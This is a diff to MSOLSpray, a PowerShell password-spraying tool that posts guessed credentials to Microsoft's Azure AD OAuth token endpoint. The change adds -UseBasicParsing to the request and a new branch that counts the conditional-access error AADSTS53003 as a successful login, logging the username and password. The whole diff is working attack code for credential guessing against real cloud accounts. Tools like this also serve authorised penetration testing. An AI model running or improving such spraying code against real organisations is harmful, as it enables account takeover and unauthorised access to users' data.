@@ -96,7 +96,8 @@ function Invoke-MSOLSpray{
         # Setting up the web request
         $BodyParams = @{'resource' = 'https://graph.windows.net'; 'client_id' = '1b730954-1685-4b74-9bfd-dac224a7b894' ; 'client_info' = '1' ; 'grant_type' = 'password' ; 'username' = $username ; 'password' = $password ; 'scope' = 'openid'}
         $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' =  'application/x-www-form-urlencoded'}
-        $webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr 
+        #add -UseBasicParsing argument 
+        $webrequest = Invoke-WebRequest -Uri $URL/common/oauth2/token -UseBasicParsing -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr 
 
         # If we get a 200 response code it's a valid cred
         If ($webrequest.StatusCode -eq "200"){
@@ -141,6 +142,12 @@ function Invoke-MSOLSpray{
                 $fullresults += "$username : $password"
                 }
 
+            #Conditional Access response (access policy blocks token issuance).
+            ElseIf($RespErr -match "AADSTS53003")
+                {
+                Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The response indicates a conditional access policy is in place and the policy blocks token issuance."
+                $fullresults += "$username : $password"
+                }
                 # Locked out account or Smart Lockout in place
             ElseIf($RespErr -match "AADSTS50053")
                 {
